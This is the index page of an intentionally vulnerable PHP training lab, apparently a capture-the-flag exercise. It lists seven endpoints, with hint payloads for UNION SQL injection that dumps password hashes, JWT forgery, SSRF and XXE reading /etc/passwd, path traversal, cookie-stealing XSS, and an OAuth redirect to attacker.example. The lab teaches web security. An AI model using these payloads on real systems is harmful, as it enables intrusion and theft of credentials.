<?php $self = $_SERVER['HTTP_HOST'] ?? 'localhost:8001'; ?><!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>VulnNexus — API Portal</title>
<style>
:root{--bg:#f4f6fb;--card:#fff;--ink:#1b2430;--muted:#5b6b7e;--line:#e3e8f0;--brand:#7a3df0;--brand2:#1f6feb;--ok:#1f9d57}
*{box-sizing:border-box}body{font-family:system-ui,Segoe UI,Arial,sans-serif;background:var(--bg);color:var(--ink);margin:0;line-height:1.5}
.topbar{position:sticky;top:0;z-index:5;background:linear-gradient(120deg,#2a1457,#7a3df0);color:#fff;padding:12px 18px;display:flex;align-items:center;gap:12px;box-shadow:0 2px 8px rgba(30,20,60,.18)}
.brand{font-weight:700;font-size:1.15em}.badge{font-size:.72em;background:rgba(255,255,255,.18);padding:2px 9px;border-radius:20px}
.nav{margin-left:auto;display:flex;gap:8px;flex-wrap:wrap}.nav a{color:#fff;text-decoration:none;font-size:.85em;background:rgba(255,255,255,.12);padding:5px 11px;border-radius:7px}.nav a:hover{background:rgba(255,255,255,.26)}
.wrap{max-width:900px;margin:22px auto;padding:0 16px}
.card{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:16px 18px;margin:14px 0;box-shadow:0 1px 3px rgba(20,40,80,.06)}
.card h2{margin:0 0 8px;font-size:1.02em;color:#2a1457;display:flex;align-items:center;gap:8px;flex-wrap:wrap}
.card h2 code{background:#f0ecfb;color:#5b2bd6;padding:2px 7px;border-radius:5px;font-size:.92em}
.flag-pill{font-size:.7em;font-weight:600;background:#fdebc6;color:#8a5a00;padding:2px 8px;border-radius:20px}
details{margin:6px 0 10px}summary{cursor:pointer;color:var(--brand2);font-size:.9em}
details .pl{display:block;margin:8px 0;background:#0f1622;color:#9ce6a0;padding:8px 10px;border-radius:6px;font-family:ui-monospace,Consolas,monospace;font-size:.85em;white-space:pre-wrap;word-break:break-all}
form{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin:4px 0}
input[type=text],textarea{flex:1;min-width:220px;padding:8px 10px;border:1px solid var(--line);border-radius:7px;font-family:ui-monospace,Consolas,monospace;font-size:.9em}
textarea{min-height:92px;width:100%}
button{background:var(--brand);color:#fff;border:0;border-radius:7px;padding:8px 13px;cursor:pointer;font-size:.88em}
button.ghost{background:#eef2f9;color:var(--brand2)}button:hover{filter:brightness(1.06)}
.res{width:100%;height:180px;border:1px solid var(--line);border-radius:8px;background:#fff;margin-top:8px;display:none}
.rx{white-space:pre-wrap;background:#0f1622;color:#dfe6ee;border-radius:8px;padding:10px;margin-top:8px;font-family:ui-monospace,Consolas,monospace;font-size:.85em;display:none;max-height:220px;overflow:auto}
.muted{color:var(--muted);font-size:.92em}.ok{border-color:var(--ok);background:#eafaf0}
footer{max-width:900px;margin:10px auto 50px;padding:14px 16px;color:var(--muted);font-size:.85em;border-top:1px solid var(--line)}footer a{color:var(--brand2)}
</style></head><body>
<div class="topbar"><span class="brand">⬡ VulnNexus</span><span class="badge">app 2 · medium → hard</span>
<nav class="nav"><a href="index.php">Home</a><a href="progress.php">📊 Progress</a><a href="reset.php" title="drop &amp; reseed the DB">↺ Reset</a><a href="feedback.php">💬 Feedback</a></nav></div>
<div class="wrap">
<?php if(isset($_GET['reset'])) echo "<div class='card ok'>✅ Lab reset to a clean state (DB reseeded).</div>"; ?>

<div class="card"><h2>API endpoints — seven flags to capture 🏁</h2>
<p class="muted">An API-style target: responses are raw (JSON / text / XML). For each endpoint you see
<b>what</b> it is and the <b>vuln class</b> — work out the payload yourself. Stuck? Click <b>💡 hint</b>,
then <b>“use this”</b> to drop the example into the box and <b>Run</b> (encoding is handled for you).
Full walkthroughs are in <code>SOLUTIONS.md</code>.</p></div>

<!-- 1. SQLi -->
<div class="card"><h2>1 · <code>search.php?q=</code> <span class="flag-pill">🏁 UNION SQLi</span></h2>
  <p class="muted">Product search. The query has 3 columns. Enumerate <code>information_schema</code> → dump
     the <code>secrets</code> table (flag) and the <code>users</code> table (crackable MD5 hashes).</p>
  <details><summary>💡 hint</summary><code class="pl" id="pl_q">zzz%' UNION SELECT k,v,3 FROM secrets-- -</code>
    <button type="button" class="ghost" onclick="fill('in_q','pl_q')">use this ▶</button>
    <code class="pl" id="pl_q2">zzz%' UNION SELECT GROUP_CONCAT(username,0x3a,password,0x3a,role SEPARATOR 0x0a),2,3 FROM users-- -</code>
    <button type="button" class="ghost" onclick="fill('in_q','pl_q2')">use this (dump users) ▶</button></details>
  <form method="get" action="search.php" target="r_q" onsubmit="show('r_q')">
    <input type="text" id="in_q" name="q" placeholder="type your SQLi payload…"><button>Run ▶</button></form>
  <iframe name="r_q" id="r_q" class="res"></iframe></div>

<!-- 2. JWT -->
<div class="card"><h2>2 · <code>login.php</code> → <code>account.php</code> <span class="flag-pill">🏁 JWT forgery</span></h2>
  <p class="muted">Log in to get a <code>session</code> JWT, then make yourself <code>role=admin</code>
     (<b>alg:none</b> or crack the weak HS256 secret). Edit the cookie in DevTools / jwt.io, then open account.</p>
  <details><summary>💡 hint</summary><code class="pl" id="pl_login">alice / alice123  → decode the JWT at jwt.io → re-sign with role=admin (alg:none, or secret "secret")</code></details>
  <form method="post" action="login.php" target="r_jwt" onsubmit="show('r_jwt')">
    <input type="text" id="in_u" name="username" placeholder="username" style="min-width:120px">
    <input type="text" id="in_p" name="password" placeholder="password" style="min-width:120px">
    <button type="button" class="ghost" onclick="document.getElementById('in_u').value='alice';document.getElementById('in_p').value='alice123'">fill alice ▶</button>
    <button>Login ▶</button></form>
  <form method="get" action="account.php" target="r_jwt" onsubmit="show('r_jwt')" style="margin-top:0"><button class="ghost">open account.php ▶</button></form>
  <iframe name="r_jwt" id="r_jwt" class="res"></iframe></div>

<!-- 3. SSRF -->
<div class="card"><h2>3 · <code>fetch.php?url=</code> <span class="flag-pill">🏁 SSRF</span></h2>
  <p class="muted">Server-side URL fetcher — no allow-list. Reach an internal service or a local file.</p>
  <details><summary>💡 hint</summary><code class="pl" id="pl_url">http://127.0.0.1:8001/metadata.php</code>
    <button type="button" class="ghost" onclick="fill('in_url','pl_url')">use this ▶</button>
    <span class="muted"> · also try <code>file:///etc/passwd</code></span></details>
  <form method="get" action="fetch.php" target="r_url" onsubmit="show('r_url')">
    <input type="text" id="in_url" name="url" placeholder="a URL the server will fetch…"><button>Run ▶</button></form>
  <iframe name="r_url" id="r_url" class="res"></iframe></div>

<!-- 4. XXE -->
<div class="card"><h2>4 · <code>import.php</code> (POST XML) <span class="flag-pill">🏁 XXE</span></h2>
  <p class="muted">Imports an XML order. External entities are resolved → read local files. <i>(needs <code>php-xml</code>)</i></p>
  <details><summary>💡 hint</summary><code class="pl" id="pl_xml">&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE x [&lt;!ENTITY e SYSTEM "file:///etc/passwd"&gt;]&gt;
&lt;order&gt;&lt;item&gt;&amp;e;&lt;/item&gt;&lt;/order&gt;</code>
    <button type="button" class="ghost" onclick="fill('in_xml','pl_xml')">use this ▶</button></details>
  <textarea id="in_xml" placeholder="paste an XML document…"></textarea>
  <div><button type="button" onclick="sendXml()">Send XML ▶</button></div>
  <pre id="r_xml" class="rx"></pre></div>

<!-- 5. Path traversal -->
<div class="card"><h2>5 · <code>download.php?file=</code> <span class="flag-pill">🏁 path traversal</span></h2>
  <p class="muted">Downloads a file from <code>docs/</code>. Escape it with <code>../</code>.</p>
  <details><summary>💡 hint</summary><code class="pl" id="pl_file">../private2/secret_config.txt</code>
    <button type="button" class="ghost" onclick="fill('in_file','pl_file')">use this ▶</button></details>
  <form method="get" action="download.php" target="r_file" onsubmit="show('r_file')">
    <input type="text" id="in_file" name="file" placeholder="a file path…"><button>Run ▶</button></form>
  <iframe name="r_file" id="r_file" class="res"></iframe></div>

<!-- 6. Filtered XSS -->
<div class="card"><h2>6 · <code>greet.php?name=</code> <span class="flag-pill">🏁 filtered XSS</span></h2>
  <p class="muted">Greeting with a naive filter that strips <code>&lt;script&gt;</code> once. Bypass it; the page sets a non-HttpOnly <code>flag</code> cookie.</p>
  <details><summary>💡 hint</summary><code class="pl" id="pl_name">&lt;img src=x onerror=alert(document.cookie)&gt;</code>
    <button type="button" class="ghost" onclick="fill('in_name','pl_name')">use this ▶</button>
    <span class="muted"> · or nested <code>&lt;scr&lt;script&gt;ipt&gt;</code></span></details>
  <form method="get" action="greet.php" target="r_name" onsubmit="show('r_name')">
    <input type="text" id="in_name" name="name" placeholder="your XSS payload…"><button>Run ▶</button></form>
  <iframe name="r_name" id="r_name" class="res"></iframe></div>

<!-- 7. OAuth -->
<div class="card"><h2>7 · <code>oauth_authorize.php?redirect_uri=</code> <span class="flag-pill">🏁 OAuth</span></h2>
  <p class="muted">OAuth authorize endpoint. The <code>redirect_uri</code> isn't validated, so the victim's
     auth <code>code</code> can be sent to a host you control → replay it at <code>oauth_callback.php?code=</code>.</p>
  <details><summary>💡 hint</summary><code class="pl" id="pl_rd">http://attacker.example/callback</code>
    <button type="button" class="ghost" onclick="fill('in_rd','pl_rd')">use this ▶</button>
    <span class="muted"> · the code it issues is bound to “admin”; copy it to <code>oauth_callback.php?code=…</code></span></details>
  <form method="get" action="oauth_authorize.php" target="r_rd" onsubmit="show('r_rd')">
    <input type="text" id="in_rd" name="redirect_uri" placeholder="redirect_uri…"><button>Run ▶</button></form>
  <iframe name="r_rd" id="r_rd" class="res"></iframe></div>

</div>
<footer>⚠️ <b>Intentionally vulnerable — training only.</b> Run locally / isolated lab; never expose it. ·
<a href="feedback.php">Report a bug / idea</a> · walkthroughs in <code>SOLUTIONS.md</code></footer>
<script>
function fill(inputId, plId){ document.getElementById(inputId).value = document.getElementById(plId).textContent; }
function show(frameId){ document.getElementById(frameId).style.display='block'; }
function sendXml(){
  var out=document.getElementById('r_xml'); out.style.display='block'; out.textContent='sending…';
  fetch('import.php',{method:'POST',headers:{'Content-Type':'application/xml'},body:document.getElementById('in_xml').value})
    .then(r=>r.text()).then(t=>out.textContent=t).catch(e=>out.textContent='error: '+e);
}
</script>
</body></html>
